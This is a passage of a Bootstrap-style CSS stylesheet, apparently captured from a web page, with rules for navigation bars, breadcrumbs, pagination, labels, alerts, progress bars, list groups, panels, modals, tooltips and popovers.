  .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a, .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:focus { color: rgb(68, 68, 68); background-color: transparent; }
}

.navbar-inverse .navbar-link { color: rgb(119, 119, 119); }

.navbar-inverse .navbar-link:hover { color: rgb(255, 255, 255); }

.navbar-inverse .btn-link { color: rgb(119, 119, 119); }

.navbar-inverse .btn-link:hover, .navbar-inverse .btn-link:focus { color: rgb(255, 255, 255); }

.navbar-inverse .btn-link[disabled]:hover, fieldset[disabled] .navbar-inverse .btn-link:hover, .navbar-inverse .btn-link[disabled]:focus, fieldset[disabled] .navbar-inverse .btn-link:focus { color: rgb(68, 68, 68); }

.breadcrumb { padding: 8px 15px; margin-bottom: 20px; list-style: none; background-color: rgb(245, 245, 245); border-radius: 4px; }

.breadcrumb > li { display: inline-block; }

.breadcrumb > li + li::before { padding: 0px 5px; color: rgb(204, 204, 204); content: "https://sso.teachable.com/secure/teachable_accounts/sign_in/ "; }

.breadcrumb > .active { color: rgb(119, 119, 119); }

.pagination { display: inline-block; padding-left: 0px; margin: 20px 0px; border-radius: 4px; }

.pagination > li { display: inline; }

.pagination > li > a, .pagination > li > span { position: relative; float: left; padding: 6px 12px; margin-left: -1px; line-height: 1.42857; color: rgb(66, 139, 202); text-decoration: none; background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); }

.pagination > li:first-child > a, .pagination > li:first-child > span { margin-left: 0px; border-top-left-radius: 4px; border-bottom-left-radius: 4px; }

.pagination > li:last-child > a, .pagination > li:last-child > span { border-top-right-radius: 4px; border-bottom-right-radius: 4px; }

.pagination > li > a:hover, .pagination > li > span:hover, .pagination > li > a:focus, .pagination > li > span:focus { color: rgb(42, 100, 150); background-color: rgb(238, 238, 238); border-color: rgb(221, 221, 221); }

.pagination > .active > a, .pagination > .active > span, .pagination > .active > a:hover, .pagination > .active > span:hover, .pagination > .active > a:focus, .pagination > .active > span:focus { z-index: 2; color: rgb(255, 255, 255); cursor: default; background-color: rgb(66, 139, 202); border-color: rgb(66, 139, 202); }

.pagination > .disabled > span, .pagination > .disabled > span:hover, .pagination > .disabled > span:focus, .pagination > .disabled > a, .pagination > .disabled > a:hover, .pagination > .disabled > a:focus { color: rgb(119, 119, 119); cursor: not-allowed; background-color: rgb(255, 255, 255); border-color: rgb(221, 221, 221); }

.pagination-lg > li > a, .pagination-lg > li > span { padding: 10px 16px; font-size: 18px; }

.pagination-lg > li:first-child > a, .pagination-lg > li:first-child > span { border-top-left-radius: 6px; border-bottom-left-radius: 6px; }

.pagination-lg > li:last-child > a, .pagination-lg > li:last-child > span { border-top-right-radius: 6px; border-bottom-right-radius: 6px; }

.pagination-sm > li > a, .pagination-sm > li > span { padding: 5px 10px; font-size: 12px; }

.pagination-sm > li:first-child > a, .pagination-sm > li:first-child > span { border-top-left-radius: 3px; border-bottom-left-radius: 3px; }

.pagination-sm > li:last-child > a, .pagination-sm > li:last-child > span { border-top-right-radius: 3px; border-bottom-right-radius: 3px; }

.pager { padding-left: 0px; margin: 20px 0px; text-align: center; list-style: none; }

.pager li { display: inline; }

.pager li > a, .pager li > span { display: inline-block; padding: 5px 14px; background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); border-radius: 15px; }

.pager li > a:hover, .pager li > a:focus { text-decoration: none; background-color: rgb(238, 238, 238); }

.pager .next > a, .pager .next > span { float: right; }

.pager .previous > a, .pager .previous > span { float: left; }

.pager .disabled > a, .pager .disabled > a:hover, .pager .disabled > a:focus, .pager .disabled > span { color: rgb(119, 119, 119); cursor: not-allowed; background-color: rgb(255, 255, 255); }

.label { display: inline; padding: 0.2em 0.6em 0.3em; font-size: 75%; font-weight: 700; line-height: 1; color: rgb(255, 255, 255); text-align: center; white-space: nowrap; vertical-align: baseline; border-radius: 0.25em; }

a.label:hover, a.label:focus { color: rgb(255, 255, 255); text-decoration: none; cursor: pointer; }

.label:empty { display: none; }

.btn .label { position: relative; top: -1px; }

.label-default { background-color: rgb(119, 119, 119); }

.label-default[href]:hover, .label-default[href]:focus { background-color: rgb(94, 94, 94); }

.label-primary { background-color: rgb(66, 139, 202); }

.label-primary[href]:hover, .label-primary[href]:focus { background-color: rgb(48, 113, 169); }

.label-success { background-color: rgb(92, 184, 92); }

.label-success[href]:hover, .label-success[href]:focus { background-color: rgb(68, 157, 68); }

.label-info { background-color: rgb(91, 192, 222); }

.label-info[href]:hover, .label-info[href]:focus { background-color: rgb(49, 176, 213); }

.label-warning { background-color: rgb(240, 173, 78); }

.label-warning[href]:hover, .label-warning[href]:focus { background-color: rgb(236, 151, 31); }

.label-danger { background-color: rgb(217, 83, 79); }

.label-danger[href]:hover, .label-danger[href]:focus { background-color: rgb(201, 48, 44); }

.badge { display: inline-block; min-width: 10px; padding: 3px 7px; font-size: 12px; font-weight: 700; line-height: 1; color: rgb(255, 255, 255); text-align: center; white-space: nowrap; vertical-align: baseline; background-color: rgb(119, 119, 119); border-radius: 10px; }

.badge:empty { display: none; }

.btn .badge { position: relative; top: -1px; }

.btn-xs .badge { top: 0px; padding: 1px 5px; }

a.badge:hover, a.badge:focus { color: rgb(255, 255, 255); text-decoration: none; cursor: pointer; }

a.list-group-item.active > .badge, .nav-pills > .active > a > .badge { color: rgb(66, 139, 202); background-color: rgb(255, 255, 255); }

.nav-pills > li > a > .badge { margin-left: 3px; }

.jumbotron { padding: 30px; margin-bottom: 30px; color: inherit; background-color: rgb(238, 238, 238); }

.jumbotron h1, .jumbotron .h1 { color: inherit; }

.jumbotron p { margin-bottom: 15px; font-size: 21px; font-weight: 200; }

.jumbotron > hr { border-top-color: rgb(213, 213, 213); }

.container .jumbotron { border-radius: 6px; }

.jumbotron .container { max-width: 100%; }

@media screen and (min-width: 768px) {
  .jumbotron { padding-top: 48px; padding-bottom: 48px; }
  .container .jumbotron { padding-right: 60px; padding-left: 60px; }
  .jumbotron h1, .jumbotron .h1 { font-size: 63px; }
}

.thumbnail { display: block; padding: 4px; margin-bottom: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); border-radius: 4px; transition: all 0.2s ease-in-out 0s; }

.thumbnail > img, .thumbnail a > img { margin-right: auto; margin-left: auto; }

a.thumbnail:hover, a.thumbnail:focus, a.thumbnail.active { border-color: rgb(66, 139, 202); }

.thumbnail .caption { padding: 9px; color: rgb(51, 51, 51); }

.alert { padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; }

.alert h4 { margin-top: 0px; color: inherit; }

.alert .alert-link { font-weight: 700; }

.alert > p, .alert > ul { margin-bottom: 0px; }

.alert > p + p { margin-top: 5px; }

.alert-dismissable, .alert-dismissible { padding-right: 35px; }

.alert-dismissable .close, .alert-dismissible .close { position: relative; top: -2px; right: -21px; color: inherit; }

.alert-success { color: rgb(60, 118, 61); background-color: rgb(223, 240, 216); border-color: rgb(214, 233, 198); }

.alert-success hr { border-top-color: rgb(201, 226, 179); }

.alert-success .alert-link { color: rgb(43, 84, 44); }

.alert-info { color: rgb(49, 112, 143); background-color: rgb(217, 237, 247); border-color: rgb(188, 232, 241); }

.alert-info hr { border-top-color: rgb(166, 225, 236); }

.alert-info .alert-link { color: rgb(36, 82, 105); }

.alert-warning { color: rgb(138, 109, 59); background-color: rgb(252, 248, 227); border-color: rgb(250, 235, 204); }

.alert-warning hr { border-top-color: rgb(247, 225, 181); }

.alert-warning .alert-link { color: rgb(102, 81, 44); }

.alert-danger { color: rgb(169, 68, 66); background-color: rgb(242, 222, 222); border-color: rgb(235, 204, 209); }

.alert-danger hr { border-top-color: rgb(228, 185, 192); }

.alert-danger .alert-link { color: rgb(132, 53, 52); }

@-webkit-keyframes progress-bar-stripes { 
  0% { background-position: 40px 0px; }
  100% { background-position: 0px 0px; }
}

@keyframes progress-bar-stripes { 
  0% { background-position: 40px 0px; }
  100% { background-position: 0px 0px; }
}

.progress { height: 20px; margin-bottom: 20px; overflow: hidden; background-color: rgb(245, 245, 245); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 2px inset; }

.progress-bar { float: left; width: 0px; height: 100%; font-size: 12px; line-height: 20px; color: rgb(255, 255, 255); text-align: center; background-color: rgb(66, 139, 202); box-shadow: rgba(0, 0, 0, 0.15) 0px -1px 0px inset; transition: width 0.6s ease 0s; }

.progress-striped .progress-bar, .progress-bar-striped { background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent); background-size: 40px 40px; }

.progress.active .progress-bar, .progress-bar.active { animation: 2s linear 0s infinite normal none running progress-bar-stripes; }

.progress-bar[aria-valuenow="1"], .progress-bar[aria-valuenow="2"] { min-width: 30px; }

.progress-bar[aria-valuenow="0"] { min-width: 30px; color: rgb(119, 119, 119); background-color: transparent; background-image: none; box-shadow: none; }

.progress-bar-success { background-color: rgb(92, 184, 92); }

.progress-striped .progress-bar-success { background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent); }

.progress-bar-info { background-color: rgb(91, 192, 222); }

.progress-striped .progress-bar-info { background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent); }

.progress-bar-warning { background-color: rgb(240, 173, 78); }

.progress-striped .progress-bar-warning { background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent); }

.progress-bar-danger { background-color: rgb(217, 83, 79); }

.progress-striped .progress-bar-danger { background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent); }

.media, .media-body { overflow: hidden; zoom: 1; }

.media, .media .media { margin-top: 15px; }

.media:first-child { margin-top: 0px; }

.media-object { display: block; }

.media-heading { margin: 0px 0px 5px; }

.media > .pull-left { margin-right: 10px; }

.media > .pull-right { margin-left: 10px; }

.media-list { padding-left: 0px; list-style: none; }

.list-group { padding-left: 0px; margin-bottom: 20px; }

.list-group-item { position: relative; display: block; padding: 10px 15px; margin-bottom: -1px; background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); }

.list-group-item:first-child { border-top-left-radius: 4px; border-top-right-radius: 4px; }

.list-group-item:last-child { margin-bottom: 0px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; }

.list-group-item > .badge { float: right; }

.list-group-item > .badge + .badge { margin-right: 5px; }

a.list-group-item { color: rgb(85, 85, 85); }

a.list-group-item .list-group-item-heading { color: rgb(51, 51, 51); }

a.list-group-item:hover, a.list-group-item:focus { color: rgb(85, 85, 85); text-decoration: none; background-color: rgb(245, 245, 245); }

.list-group-item.disabled, .list-group-item.disabled:hover, .list-group-item.disabled:focus { color: rgb(119, 119, 119); background-color: rgb(238, 238, 238); }

.list-group-item.disabled .list-group-item-heading, .list-group-item.disabled:hover .list-group-item-heading, .list-group-item.disabled:focus .list-group-item-heading { color: inherit; }

.list-group-item.disabled .list-group-item-text, .list-group-item.disabled:hover .list-group-item-text, .list-group-item.disabled:focus .list-group-item-text { color: rgb(119, 119, 119); }

.list-group-item.active, .list-group-item.active:hover, .list-group-item.active:focus { z-index: 2; color: rgb(255, 255, 255); background-color: rgb(66, 139, 202); border-color: rgb(66, 139, 202); }

.list-group-item.active .list-group-item-heading, .list-group-item.active:hover .list-group-item-heading, .list-group-item.active:focus .list-group-item-heading, .list-group-item.active .list-group-item-heading > small, .list-group-item.active:hover .list-group-item-heading > small, .list-group-item.active:focus .list-group-item-heading > small, .list-group-item.active .list-group-item-heading > .small, .list-group-item.active:hover .list-group-item-heading > .small, .list-group-item.active:focus .list-group-item-heading > .small { color: inherit; }

.list-group-item.active .list-group-item-text, .list-group-item.active:hover .list-group-item-text, .list-group-item.active:focus .list-group-item-text { color: rgb(225, 237, 247); }

.list-group-item-success { color: rgb(60, 118, 61); background-color: rgb(223, 240, 216); }

a.list-group-item-success { color: rgb(60, 118, 61); }

a.list-group-item-success .list-group-item-heading { color: inherit; }

a.list-group-item-success:hover, a.list-group-item-success:focus { color: rgb(60, 118, 61); background-color: rgb(208, 233, 198); }

a.list-group-item-success.active, a.list-group-item-success.active:hover, a.list-group-item-success.active:focus { color: rgb(255, 255, 255); background-color: rgb(60, 118, 61); border-color: rgb(60, 118, 61); }

.list-group-item-info { color: rgb(49, 112, 143); background-color: rgb(217, 237, 247); }

a.list-group-item-info { color: rgb(49, 112, 143); }

a.list-group-item-info .list-group-item-heading { color: inherit; }

a.list-group-item-info:hover, a.list-group-item-info:focus { color: rgb(49, 112, 143); background-color: rgb(196, 227, 243); }

a.list-group-item-info.active, a.list-group-item-info.active:hover, a.list-group-item-info.active:focus { color: rgb(255, 255, 255); background-color: rgb(49, 112, 143); border-color: rgb(49, 112, 143); }

.list-group-item-warning { color: rgb(138, 109, 59); background-color: rgb(252, 248, 227); }

a.list-group-item-warning { color: rgb(138, 109, 59); }

a.list-group-item-warning .list-group-item-heading { color: inherit; }

a.list-group-item-warning:hover, a.list-group-item-warning:focus { color: rgb(138, 109, 59); background-color: rgb(250, 242, 204); }

a.list-group-item-warning.active, a.list-group-item-warning.active:hover, a.list-group-item-warning.active:focus { color: rgb(255, 255, 255); background-color: rgb(138, 109, 59); border-color: rgb(138, 109, 59); }

.list-group-item-danger { color: rgb(169, 68, 66); background-color: rgb(242, 222, 222); }

a.list-group-item-danger { color: rgb(169, 68, 66); }

a.list-group-item-danger .list-group-item-heading { color: inherit; }

a.list-group-item-danger:hover, a.list-group-item-danger:focus { color: rgb(169, 68, 66); background-color: rgb(235, 204, 204); }

a.list-group-item-danger.active, a.list-group-item-danger.active:hover, a.list-group-item-danger.active:focus { color: rgb(255, 255, 255); background-color: rgb(169, 68, 66); border-color: rgb(169, 68, 66); }

.list-group-item-heading { margin-top: 0px; margin-bottom: 5px; }

.list-group-item-text { margin-bottom: 0px; line-height: 1.3; }

.panel { margin-bottom: 20px; background-color: rgb(255, 255, 255); border: 1px solid transparent; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.05) 0px 1px 1px; }

.panel-body { padding: 15px; }

.panel-heading { padding: 10px 15px; border-bottom: 1px solid transparent; border-top-left-radius: 3px; border-top-right-radius: 3px; }

.panel-heading > .dropdown .dropdown-toggle { color: inherit; }

.panel-title { margin-top: 0px; margin-bottom: 0px; font-size: 16px; color: inherit; }

.panel-title > a { color: inherit; }

.panel-footer { padding: 10px 15px; background-color: rgb(245, 245, 245); border-top: 1px solid rgb(221, 221, 221); border-bottom-right-radius: 3px; border-bottom-left-radius: 3px; }

.panel > .list-group { margin-bottom: 0px; }

.panel > .list-group .list-group-item { border-width: 1px 0px; border-radius: 0px; }

.panel > .list-group:first-child .list-group-item:first-child { border-top: 0px; border-top-left-radius: 3px; border-top-right-radius: 3px; }

.panel > .list-group:last-child .list-group-item:last-child { border-bottom: 0px; border-bottom-right-radius: 3px; border-bottom-left-radius: 3px; }

.panel-heading + .list-group .list-group-item:first-child { border-top-width: 0px; }

.list-group + .panel-footer { border-top-width: 0px; }

.panel > .table, .panel > .table-responsive > .table, .panel > .panel-collapse > .table { margin-bottom: 0px; }

.panel > .table:first-child, .panel > .table-responsive:first-child > .table:first-child { border-top-left-radius: 3px; border-top-right-radius: 3px; }

.panel > .table:first-child > thead:first-child > tr:first-child td:first-child, .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:first-child, .panel > .table:first-child > tbody:first-child > tr:first-child td:first-child, .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:first-child, .panel > .table:first-child > thead:first-child > tr:first-child th:first-child, .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:first-child, .panel > .table:first-child > tbody:first-child > tr:first-child th:first-child, .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:first-child { border-top-left-radius: 3px; }

.panel > .table:first-child > thead:first-child > tr:first-child td:last-child, .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:last-child, .panel > .table:first-child > tbody:first-child > tr:first-child td:last-child, .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:last-child, .panel > .table:first-child > thead:first-child > tr:first-child th:last-child, .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:last-child, .panel > .table:first-child > tbody:first-child > tr:first-child th:last-child, .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:last-child { border-top-right-radius: 3px; }

.panel > .table:last-child, .panel > .table-responsive:last-child > .table:last-child { border-bottom-right-radius: 3px; border-bottom-left-radius: 3px; }

.panel > .table:last-child > tbody:last-child > tr:last-child td:first-child, .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:first-child, .panel > .table:last-child > tfoot:last-child > tr:last-child td:first-child, .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:first-child, .panel > .table:last-child > tbody:last-child > tr:last-child th:first-child, .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:first-child, .panel > .table:last-child > tfoot:last-child > tr:last-child th:first-child, .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:first-child { border-bottom-left-radius: 3px; }

.panel > .table:last-child > tbody:last-child > tr:last-child td:last-child, .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:last-child, .panel > .table:last-child > tfoot:last-child > tr:last-child td:last-child, .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:last-child, .panel > .table:last-child > tbody:last-child > tr:last-child th:last-child, .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:last-child, .panel > .table:last-child > tfoot:last-child > tr:last-child th:last-child, .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:last-child { border-bottom-right-radius: 3px; }

.panel > .panel-body + .table, .panel > .panel-body + .table-responsive { border-top: 1px solid rgb(221, 221, 221); }

.panel > .table > tbody:first-child > tr:first-child th, .panel > .table > tbody:first-child > tr:first-child td { border-top: 0px; }

.panel > .table-bordered, .panel > .table-responsive > .table-bordered { border: 0px; }

.panel > .table-bordered > thead > tr > th:first-child, .panel > .table-responsive > .table-bordered > thead > tr > th:first-child, .panel > .table-bordered > tbody > tr > th:first-child, .panel > .table-responsive > .table-bordered > tbody > tr > th:first-child, .panel > .table-bordered > tfoot > tr > th:first-child, .panel > .table-responsive > .table-bordered > tfoot > tr > th:first-child, .panel > .table-bordered > thead > tr > td:first-child, .panel > .table-responsive > .table-bordered > thead > tr > td:first-child, .panel > .table-bordered > tbody > tr > td:first-child, .panel > .table-responsive > .table-bordered > tbody > tr > td:first-child, .panel > .table-bordered > tfoot > tr > td:first-child, .panel > .table-responsive > .table-bordered > tfoot > tr > td:first-child { border-left: 0px; }

.panel > .table-bordered > thead > tr > th:last-child, .panel > .table-responsive > .table-bordered > thead > tr > th:last-child, .panel > .table-bordered > tbody > tr > th:last-child, .panel > .table-responsive > .table-bordered > tbody > tr > th:last-child, .panel > .table-bordered > tfoot > tr > th:last-child, .panel > .table-responsive > .table-bordered > tfoot > tr > th:last-child, .panel > .table-bordered > thead > tr > td:last-child, .panel > .table-responsive > .table-bordered > thead > tr > td:last-child, .panel > .table-bordered > tbody > tr > td:last-child, .panel > .table-responsive > .table-bordered > tbody > tr > td:last-child, .panel > .table-bordered > tfoot > tr > td:last-child, .panel > .table-responsive > .table-bordered > tfoot > tr > td:last-child { border-right: 0px; }

.panel > .table-bordered > thead > tr:first-child > td, .panel > .table-responsive > .table-bordered > thead > tr:first-child > td, .panel > .table-bordered > tbody > tr:first-child > td, .panel > .table-responsive > .table-bordered > tbody > tr:first-child > td, .panel > .table-bordered > thead > tr:first-child > th, .panel > .table-responsive > .table-bordered > thead > tr:first-child > th, .panel > .table-bordered > tbody > tr:first-child > th, .panel > .table-responsive > .table-bordered > tbody > tr:first-child > th { border-bottom: 0px; }

.panel > .table-bordered > tbody > tr:last-child > td, .panel > .table-responsive > .table-bordered > tbody > tr:last-child > td, .panel > .table-bordered > tfoot > tr:last-child > td, .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > td, .panel > .table-bordered > tbody > tr:last-child > th, .panel > .table-responsive > .table-bordered > tbody > tr:last-child > th, .panel > .table-bordered > tfoot > tr:last-child > th, .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > th { border-bottom: 0px; }

.panel > .table-responsive { margin-bottom: 0px; border: 0px; }

.panel-group { margin-bottom: 20px; }

.panel-group .panel { margin-bottom: 0px; border-radius: 4px; }

.panel-group .panel + .panel { margin-top: 5px; }

.panel-group .panel-heading { border-bottom: 0px; }

.panel-group .panel-heading + .panel-collapse > .panel-body { border-top: 1px solid rgb(221, 221, 221); }

.panel-group .panel-footer { border-top: 0px; }

.panel-group .panel-footer + .panel-collapse .panel-body { border-bottom: 1px solid rgb(221, 221, 221); }

.panel-default { border-color: rgb(221, 221, 221); }

.panel-default > .panel-heading { color: rgb(51, 51, 51); background-color: rgb(245, 245, 245); border-color: rgb(221, 221, 221); }

.panel-default > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(221, 221, 221); }

.panel-default > .panel-heading .badge { color: rgb(245, 245, 245); background-color: rgb(51, 51, 51); }

.panel-default > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(221, 221, 221); }

.panel-primary { border-color: rgb(66, 139, 202); }

.panel-primary > .panel-heading { color: rgb(255, 255, 255); background-color: rgb(66, 139, 202); border-color: rgb(66, 139, 202); }

.panel-primary > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(66, 139, 202); }

.panel-primary > .panel-heading .badge { color: rgb(66, 139, 202); background-color: rgb(255, 255, 255); }

.panel-primary > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(66, 139, 202); }

.panel-success { border-color: rgb(214, 233, 198); }

.panel-success > .panel-heading { color: rgb(60, 118, 61); background-color: rgb(223, 240, 216); border-color: rgb(214, 233, 198); }

.panel-success > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(214, 233, 198); }

.panel-success > .panel-heading .badge { color: rgb(223, 240, 216); background-color: rgb(60, 118, 61); }

.panel-success > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(214, 233, 198); }

.panel-info { border-color: rgb(188, 232, 241); }

.panel-info > .panel-heading { color: rgb(49, 112, 143); background-color: rgb(217, 237, 247); border-color: rgb(188, 232, 241); }

.panel-info > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(188, 232, 241); }

.panel-info > .panel-heading .badge { color: rgb(217, 237, 247); background-color: rgb(49, 112, 143); }

.panel-info > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(188, 232, 241); }

.panel-warning { border-color: rgb(250, 235, 204); }

.panel-warning > .panel-heading { color: rgb(138, 109, 59); background-color: rgb(252, 248, 227); border-color: rgb(250, 235, 204); }

.panel-warning > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(250, 235, 204); }

.panel-warning > .panel-heading .badge { color: rgb(252, 248, 227); background-color: rgb(138, 109, 59); }

.panel-warning > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(250, 235, 204); }

.panel-danger { border-color: rgb(235, 204, 209); }

.panel-danger > .panel-heading { color: rgb(169, 68, 66); background-color: rgb(242, 222, 222); border-color: rgb(235, 204, 209); }

.panel-danger > .panel-heading + .panel-collapse > .panel-body { border-top-color: rgb(235, 204, 209); }

.panel-danger > .panel-heading .badge { color: rgb(242, 222, 222); background-color: rgb(169, 68, 66); }

.panel-danger > .panel-footer + .panel-collapse > .panel-body { border-bottom-color: rgb(235, 204, 209); }

.embed-responsive { position: relative; display: block; height: 0px; padding: 0px; overflow: hidden; }

.embed-responsive .embed-responsive-item, .embed-responsive iframe, .embed-responsive embed, .embed-responsive object { position: absolute; top: 0px; bottom: 0px; left: 0px; width: 100%; height: 100%; border: 0px; }

.embed-responsive.embed-responsive-16by9 { padding-bottom: 56.25%; }

.embed-responsive.embed-responsive-4by3 { padding-bottom: 75%; }

.well { min-height: 20px; padding: 19px; margin-bottom: 20px; background-color: rgb(245, 245, 245); border: 1px solid rgb(227, 227, 227); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.05) 0px 1px 1px inset; }

.well blockquote { border-color: rgba(0, 0, 0, 0.15); }

.well-lg { padding: 24px; border-radius: 6px; }

.well-sm { padding: 9px; border-radius: 3px; }

.close { float: right; font-size: 21px; font-weight: 700; line-height: 1; color: rgb(0, 0, 0); text-shadow: rgb(255, 255, 255) 0px 1px 0px; opacity: 0.2; }

.close:hover, .close:focus { color: rgb(0, 0, 0); text-decoration: none; cursor: pointer; opacity: 0.5; }

button.close { appearance: none; padding: 0px; cursor: pointer; background: 0px 0px; border: 0px; }

.modal-open { overflow: hidden; }

.modal { position: fixed; inset: 0px; z-index: 1050; display: none; overflow: hidden; outline: 0px; }

.modal.fade .modal-dialog { transition: transform 0.3s ease-out 0s, -webkit-transform 0.3s ease-out 0s; transform: translate3d(0px, -25%, 0px); }

.modal.in .modal-dialog { transform: translate3d(0px, 0px, 0px); }

.modal-open .modal { overflow: hidden auto; }

.modal-dialog { position: relative; width: auto; margin: 10px; }

.modal-content { position: relative; background-color: rgb(255, 255, 255); background-clip: padding-box; border: 1px solid rgba(0, 0, 0, 0.2); border-radius: 6px; outline: 0px; box-shadow: rgba(0, 0, 0, 0.5) 0px 3px 9px; }

.modal-backdrop { position: fixed; inset: 0px; z-index: 1040; background-color: rgb(0, 0, 0); }

.modal-backdrop.fade { opacity: 0; }

.modal-backdrop.in { opacity: 0.5; }

.modal-header { min-height: 16.43px; padding: 15px; border-bottom: 1px solid rgb(229, 229, 229); }

.modal-header .close { margin-top: -2px; }

.modal-title { margin: 0px; line-height: 1.42857; }

.modal-body { position: relative; padding: 15px; }

.modal-footer { padding: 15px; text-align: right; border-top: 1px solid rgb(229, 229, 229); }

.modal-footer .btn + .btn { margin-bottom: 0px; margin-left: 5px; }

.modal-footer .btn-group .btn + .btn { margin-left: -1px; }

.modal-footer .btn-block + .btn-block { margin-left: 0px; }

.modal-scrollbar-measure { position: absolute; top: -9999px; width: 50px; height: 50px; overflow: scroll; }

@media (min-width: 768px) {
  .modal-dialog { width: 600px; margin: 30px auto; }
  .modal-content { box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px; }
  .modal-sm { width: 300px; }
}

@media (min-width: 992px) {
  .modal-lg { width: 900px; }
}

.tooltip { position: absolute; z-index: 1070; display: block; font-size: 12px; line-height: 1.4; visibility: visible; opacity: 0; }

.tooltip.in { opacity: 0.9; }

.tooltip.top { padding: 5px 0px; margin-top: -3px; }

.tooltip.right { padding: 0px 5px; margin-left: 3px; }

.tooltip.bottom { padding: 5px 0px; margin-top: 3px; }

.tooltip.left { padding: 0px 5px; margin-left: -3px; }

.tooltip-inner { max-width: 200px; padding: 3px 8px; color: rgb(255, 255, 255); text-align: center; text-decoration: none; background-color: rgb(0, 0, 0); border-radius: 4px; }

.tooltip-arrow { position: absolute; width: 0px; height: 0px; border-color: transparent; border-style: solid; }

.tooltip.top .tooltip-arrow { bottom: 0px; left: 50%; margin-left: -5px; border-width: 5px 5px 0px; border-top-color: rgb(0, 0, 0); }

.tooltip.top-left .tooltip-arrow { bottom: 0px; left: 5px; border-width: 5px 5px 0px; border-top-color: rgb(0, 0, 0); }

.tooltip.top-right .tooltip-arrow { right: 5px; bottom: 0px; border-width: 5px 5px 0px; border-top-color: rgb(0, 0, 0); }

.tooltip.right .tooltip-arrow { top: 50%; left: 0px; margin-top: -5px; border-width: 5px 5px 5px 0px; border-right-color: rgb(0, 0, 0); }

.tooltip.left .tooltip-arrow { top: 50%; right: 0px; margin-top: -5px; border-width: 5px 0px 5px 5px; border-left-color: rgb(0, 0, 0); }

.tooltip.bottom .tooltip-arrow { top: 0px; left: 50%; margin-left: -5px; border-width: 0px 5px 5px; border-bottom-color: rgb(0, 0, 0); }

.tooltip.bottom-left .tooltip-arrow { top: 0px; left: 5px; border-width: 0px 5px 5px; border-bottom-color: rgb(0, 0, 0); }

.tooltip.bottom-right .tooltip-arrow { top: 0px; right: 5px; border-width: 0px 5px 5px; border-bottom-color: rgb(0, 0, 0); }

.popover { position: absolute; top: 0px; left: 0px; z-index: 1060; display: none; max-width: 276px; padding: 1px; text-align: left; white-space: normal; background-color: rgb(255, 255, 255); background-clip: padding-box; border: 1px solid rgba(0, 0, 0, 0.2); border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.2) 0px 5px 10px; }

.popover.top { margin-top: -10px; }

.popover.right { margin-left: 10px; }

.popover.bottom { margin-top: 10px; }

.popover.left { margin-left: -10px; }

.popover-title { padding: 8px 14px; margin: 0px; font-size: 14px; font-weight: 400; line-height: 18px; background-color: rgb(247, 247, 247); border-bottom: 1px solid rgb(235, 235, 235); border-radius: 5px 5px 0px 0px; }

.popover-content { padding: 9px 14px; }

.popover > .arrow, .popover > .arrow::after { position: absolute; display: block; width: 0px; height: 0px; border-color: transparent; border-style: solid; }

.popover > .arrow { border-width: 11px; }

.popover > .arrow::after { content: ""; border-width: 10px; }

